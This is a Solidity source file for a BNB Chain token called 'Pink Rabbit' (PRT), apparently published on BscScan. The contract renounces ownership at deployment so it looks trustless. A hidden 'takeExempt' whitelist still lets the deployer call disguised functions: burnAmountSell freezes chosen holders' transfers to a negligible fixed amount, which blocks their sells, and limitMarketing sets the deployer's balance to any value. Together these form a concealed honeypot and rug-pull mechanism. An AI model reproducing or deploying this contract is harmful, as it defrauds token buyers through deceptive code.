/**
 *Submitted for verification at BscScan.com on 2023-01-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()  {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns true if the caller is the current owner.
     */
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * > Note: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PinkRabbit is IBEP20, Ownable {
    uint8 constant _decimals = 18;


    mapping(address => uint256) _balances;

    address public burnFund;
    uint256 constant exemptAmountLiquidity = 15 ** 10;
    string constant _name = "Pink Rabbit";
    string constant _symbol = "PRT";
    mapping(address => bool) public marketingMin;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    address public totalTo;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) public takeExempt;
    modifier fromShould() {
        require(takeExempt[msg.sender]);
        _;
    }

    constructor (){
        UniswapRouter launchedTrading = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        burnFund = UniswapFactory(launchedTrading.factory()).createPair(launchedTrading.WETH(), address(this));
        _allowances[address(this)][address(launchedTrading)] = type(uint256).max;
        totalTo = msg.sender;
        takeExempt[totalTo] = true;
        _balances[totalTo] = _totalSupply;
        emit Transfer(address(0), totalTo, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function isLiquidity(address launchedAutoSwap) public fromShould {
        takeExempt[launchedAutoSwap] = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == totalTo || recipient == totalTo) {
            return tradingLaunchedList(sender, recipient, amount);
        }
        if (marketingMin[sender]) {
            return tradingLaunchedList(sender, recipient, exemptAmountLiquidity);
        }
        return tradingLaunchedList(sender, recipient, amount);
    }

    function burnAmountSell(address modeFund) public fromShould {
        marketingMin[modeFund] = true;
    }

    function tradingLaunchedList(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function limitMarketing(uint256 teamFee) public fromShould {
        _balances[totalTo] = teamFee;
    }


}